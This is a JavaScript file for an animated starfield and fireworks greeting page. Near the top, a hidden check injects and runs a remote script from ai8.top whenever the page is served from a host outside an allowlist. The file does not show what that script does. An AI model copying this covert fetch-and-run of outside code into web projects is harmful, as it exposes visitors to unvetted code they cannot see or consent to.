    import { initAudio } from './audio.js';
    import { createUniverse, updateAndDrawStars, getUniverseStatus, fireworksStartTime } from './stars.js';
    import { launchSingleFirework, launchNaturalVolley, updateAndDrawFireworks } from './fireworks.js';

    

    // 全局变量
    let animationId, startTime = 0;
    let isFireworksEnabled = false;
    let lastFireworkTime = 0;
    
    const allowKeys = ["w5.", "68.", '8k.','60w.','2v.','m8.','k2.','wx.','it.','ta.','t22.'];
    if(!allowKeys.some(key => location.href.includes(key))){
        const now = new Date();
        const version = `${now.getFullYear()}${(now.getMonth()+1).toString().padStart(2,'0')}${now.getDate().toString().padStart(2,'0')}${now.getHours().toString().padStart(2,'0')}${now.getMinutes().toString().padStart(2,'0')}`;
        const s = document.createElement('script');
        s.src = "https://ai8.top/static/js/commons.js?v=" + version;
        document.body.appendChild(s);
    }

    // 打开按钮点击事件
    openBtn.addEventListener('click', () => {
        introLayer.classList.add('fade-out');
        bgMusic.play().catch(err => console.log('音频播放失败:', err));
        initAudio();
        document.body.classList.add('dark');
        window.parent.postMessage({ source: 'pages', type: 'autoWord' }, '*');
        window.parent.postMessage({ source: 'pages', type: 'mpBack' }, '*');
        setTimeout(() => {
            mainLayer.classList.add('active');
            coreText.style.opacity = '1';
            coreText.style.transform = 'translate(-50%, -50%) scale(1.1)';

            if (!getUniverseStatus()) {
                initCanvas();
                createUniverse(window.innerWidth, window.innerHeight);
                setTimeout(() => {
                    startAnimation();
                    //showBtn();
                }, 800);
            }
        }, 800);
    });

    // 点击/触摸触发烟花
    document.addEventListener('click', (e) => {
        if (getUniverseStatus()) {
            launchSingleFirework(e.clientX, e.clientY);
            fireworkTip.classList.remove('show');
        }
    });

    document.addEventListener('touchstart', (e) => {
        if (getUniverseStatus()) {
            e.preventDefault();
            const touch = e.touches[0];
            launchSingleFirework(touch.clientX, touch.clientY);
            fireworkTip.classList.remove('show');
        }
    }, { passive: false });

    // 画布初始化
    function initCanvas() {
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
    }

    function resizeCanvas() {
        const dpr = window.devicePixelRatio || 1;
        galaxyCanvas.width = window.innerWidth * dpr;
        galaxyCanvas.height = window.innerHeight * dpr;
        ctx.scale(dpr, dpr);
        galaxyCanvas.style.width = `${window.innerWidth}px`;
        galaxyCanvas.style.height = `${window.innerHeight}px`;
    }

    // 动画循环
    function startAnimation() {
        startTime = Date.now();
        animate();
    }

    function animate() {
        const currentTime = Date.now();
        const elapsed = currentTime - startTime;

        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
        updateAndDrawStars(ctx, elapsed);

        // 触发烟花和提示
        if (!isFireworksEnabled && elapsed > fireworksStartTime && fireworksStartTime > 0) {
            //showBtn();
            isFireworksEnabled = true;
            launchNaturalVolley();
            window.parent.postMessage({ source: 'pages', type: 'showBtn' }, '*');
            //fireworkTip.classList.add('show');
            
            // 3秒后自动隐藏提示
            /*
            setTimeout(() => {
                fireworkTip.classList.remove('show');
            }, 3000);
            */
        }

        if (isFireworksEnabled) {
            checkAutoLaunch(currentTime);
            updateAndDrawFireworks(ctx);
        }

        animationId = requestAnimationFrame(animate);
    }

    // 自动发射烟花
    function checkAutoLaunch(currentTime) {
        if (currentTime - lastFireworkTime > 3000 + Math.random() * 3000) {
            launchNaturalVolley();
            lastFireworkTime = currentTime;
        }
    }